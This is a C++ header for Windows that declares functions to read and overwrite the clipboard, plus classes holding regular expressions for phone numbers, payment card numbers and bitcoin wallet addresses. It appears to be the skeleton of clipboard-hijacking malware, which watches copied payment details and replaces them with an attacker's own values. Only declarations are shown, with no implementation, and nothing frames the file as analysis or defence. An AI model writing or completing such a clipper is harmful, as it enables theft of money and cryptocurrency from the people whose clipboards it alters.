#pragma once

#include <Windows.h>
#include <map>
#include <string>
#include <regex>
#include <memory>
#include <iostream>

#pragma warning(disable : 4996)
#pragma warning(disable : 28183)
#pragma warning(disable : 6387)
#pragma warning(disable : 4244)

struct User_data {
  std::map<std::string, std::string> user_data;
};

std::wstring GetClipboardText();
void SetToClipboard(std::string user, HGLOBAL hgBuffer, char* chBuffer);

class Clipboard {
  public:
  virtual std::shared_ptr<std::regex> getRegex() const = 0;
};

class ClipboardPhoneNumber : public Clipboard {
 private:
  std::shared_ptr<std::regex> phone_number = nullptr;

 public:
  ClipboardPhoneNumber();
  ~ClipboardPhoneNumber(){};
  virtual std::shared_ptr<std::regex> getRegex() const override;
};

class ClipboardCardNumber : public Clipboard {
 private:
  std::shared_ptr<std::regex> card_number = nullptr;

 public:
  ClipboardCardNumber();
  ~ClipboardCardNumber(){};
  virtual std::shared_ptr<std::regex> getRegex() const override;
};

class ClipboardBitcoin : public Clipboard {
 private:
  std::shared_ptr<std::regex> bitcoin_wallet = nullptr;

 public:
  ClipboardBitcoin();
  ~ClipboardBitcoin(){};
  virtual std::shared_ptr<std::regex> getRegex() const override;
};